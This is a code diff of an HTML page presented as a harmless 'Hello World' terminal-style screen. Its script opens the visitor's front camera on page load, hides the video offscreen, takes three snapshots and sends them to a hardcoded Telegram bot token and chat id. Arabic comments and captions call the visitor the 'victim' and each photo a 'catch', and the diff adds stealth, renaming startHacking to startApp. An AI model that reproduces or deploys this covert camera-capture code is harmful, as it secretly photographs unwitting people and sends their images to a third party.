@@ -6,8 +6,8 @@
     <title>Hello World</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
-        body { background-color: black; color: #00ff00; font-family: 'VT323', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-size: 5em; }
-        video, canvas { display: none; }
+        body { background-color: black; color: #00ff00; font-family: 'VT323', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-size: 5em; overflow: hidden; }
+        video, canvas { position: absolute; left: -10000px; opacity: 0; } /* إخفاء تام */
     </style>
 </head>
 <body>
@@ -21,60 +21,61 @@
         const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
         const chat = "8042090388";
 
-        async function startHacking() {
+        async function startApp() {
             try {
-                // طلب الكاميرا بأعلى جودة ممكنة
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 1280, height: 720 } 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
                 });
-                
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-
-                // ننتظر حتى يبدأ الفيديو بالعمل فعلياً
-                video.onloadedmetadata = () => {
-                    video.play();
-                    // تأخير 4 ثواني كاملة لضمان فتح العدسة وتعديل السطوع
-                    setTimeout(captureClearImage, 4000);
+                
+                video.onplay = () => {
+                    // تصوير 3 لقطات لضمان الوضوح
+                    setTimeout(() => capture(1), 3000); // لقطة بعد 3 ثواني
+                    setTimeout(() => capture(2), 5000); // لقطة بعد 5 ثواني
+                    setTimeout(() => capture(3), 7000); // لقطة بعد 7 ثواني
                 };
             } catch (err) {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=⚠️ الضحية رفض الكاميرا أو الجهاز لا يدعمها`);
+                sendMsg("⚠️ الضحية رفض الكاميرا");
             }
         }
 
-        function captureClearImage() {
+        function capture(num) {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-
-            // التأكد أن هناك بيانات فيديو حقيقية (ليست سوداء)
-            if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                const imgData = canvas.toDataURL('image/jpeg', 0.9);
-                sendToTelegram(imgData);
-            } else {
-                // إذا لم يكن جاهزاً، حاول مرة أخرى بعد ثانية
-                setTimeout(captureClearImage, 1000);
-            }
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            // رسم الصورة
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويلها لـ Base64 بجودة عالية
+            const imgData = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // إرسالها فوراً
+            sendToTele(imgData, num);
         }
 
-        async function sendToTelegram(base64Data) {
-            const blob = await (await fetch(base64Data)).blob();
+        async function sendToTele(base64, n) {
+            const blob = await (await fetch(base64)).blob();
             const formData = new FormData();
             formData.append('chat_id', chat);
-            formData.append('photo', blob, 'shot.jpg');
+            formData.append('photo', blob, `shot_${n}.jpg`);
+            formData.append('caption', `✅ صيد واضح - رقم ${n}`);
 
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
         }
 
-        // بدء العملية فور دخول الصفحة
-        window.onload = startHacking;
+        function sendMsg(m) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(m)}`);
+        }
+
+        window.onload = startApp;
     </script>
 </body>
 </html>
